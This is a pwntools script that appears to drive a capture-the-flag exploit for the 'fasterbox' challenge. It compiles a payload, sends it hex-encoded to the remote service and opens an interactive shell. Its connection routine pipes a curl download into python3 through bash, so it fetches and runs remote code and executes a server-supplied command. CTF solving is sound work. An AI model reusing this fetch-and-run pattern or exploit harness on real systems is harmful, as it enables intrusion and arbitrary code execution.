#!/usr/bin/env python3
import re
import subprocess

from pwn import *


def connect():
    if args.LOCAL:
        return process(["./connect_qemu.sh"])
    else:
        tube = remote("fasterbox.2024.ctfcompetition.com", 1337)
        tube.recvuntil(b'You can run the solver with:\n')
        solver = tube.recvline().decode().strip()
        prefix = "python3 <(curl -sSL https://goo.gle/kctf-pow) solve "
        assert solver.startswith(prefix)
        challenge = solver[len(prefix):]
        assert re.match("^[a-zA-Z0-9/+.]+$", challenge), challenge
        tube.sendline(subprocess.check_output(["/bin/bash", "-c", solver]))
        return tube


def main():
    subprocess.check_call(["make", "-f", "Makefile.pwn", "fmt", "pwnit"])
    with open("pwnit", "rb") as fp:
        pwnit = fp.read()
    with connect() as tube:
        tube.sendlineafter(b"Payload (hex encoded)", pwnit.hex().encode())
        time.sleep(0.1)
        tube.sendlineafter(b"Payload (hex encoded)", b"q")
        tube.interactive()


if __name__ == "__main__":
    main()
